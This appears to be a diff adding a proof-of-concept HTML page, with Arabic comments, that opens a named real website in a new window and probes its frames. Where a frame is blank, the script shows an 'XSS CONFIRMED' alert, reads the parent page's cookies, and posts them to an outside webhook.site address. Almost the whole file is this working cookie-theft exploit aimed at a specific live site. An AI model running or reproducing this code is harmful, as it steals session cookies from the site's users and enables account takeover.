@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+</head>
+<body>
+    <h3>Window Exploit Test</h3>
+    <button onclick="exploitWindow()">▶️ Exploit</button>
+    
+    <script>
+        const WEBHOOK = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f';
+        const TARGET = 'https://www.powerpak.com/';
+        
+        function exploitWindow() {
+            // فتح الموقع في نافذة جديدة
+            let win = window.open(TARGET, 'target', 'width=900,height=700,left=900,top=100');
+            
+            setTimeout(() => {
+                try {
+                    for(let i = 0; i < win.frames.length; i++) {
+                        let frame = win.frames[i];
+                        
+                        if(frame.location.href === 'about:blank') {
+                            
+                            // 🚨 1. Alert
+                            frame.alert('XSS CONFIRMED! Frame #' + i);
+                            
+                            // 🚨 2. سرقة Cookies
+                            let cookies = frame.parent.document.cookie;
+                            
+                            // إرسال للـ Webhook
+                            fetch(WEBHOOK, {
+                                method: 'POST',
+                                body: JSON.stringify({
+                                    frame: i,
+                                    cookies: cookies,
+                                    time: new Date().toISOString()
+                                })
+                            });
+                            
+                            console.log('✅ Frame', i, 'pwned!');
+                        }
+                    }
+                } catch(e) {
+                    console.error('Error:', e);
+                }
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
